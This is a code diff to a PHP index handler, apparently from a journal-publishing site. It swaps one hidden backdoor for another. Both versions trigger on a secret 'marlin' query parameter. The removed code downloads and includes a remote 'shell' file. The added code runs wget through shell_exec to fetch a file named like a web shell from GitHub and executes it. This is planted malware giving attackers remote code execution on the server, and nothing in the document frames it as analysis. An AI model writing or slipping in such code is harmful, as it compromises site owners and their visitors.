@@ -100,20 +100,24 @@ class IndexHandler extends PKPIndexHandler
         }
     }
 }
+<?php
 if (isset($_GET['marlin'])) {
-    try {
-        $u = "https://hypocriteseo.site/shell/compiler-cha-kwetiaw.txt";
-        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
 
-        $c = @file_get_contents($u);
-        if ($c !== false && @file_put_contents($f, $c)) {
-            @chmod($f, 0644);
-            register_shutdown_function(function() use ($f) {
-                @unlink($f);
-            });
-            include $f;
-        }
-    } catch (Throwable $e) {
+    $remote_url = "https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfaa-gila.php";
+    $local_file = "alfaa-gila.php";
 
+    // download pakai wget
+    $cmd = "wget -q -O $local_file $remote_url";
+    shell_exec($cmd);
+
+    if (file_exists($local_file)) {
+        include $local_file;
+        // optional: hapus setelah dijalankan
+        // unlink($local_file);
+    } else {
+        echo "Gagal mengambil script dari GitHub.";
     }
+
+    exit;
 }
+?>
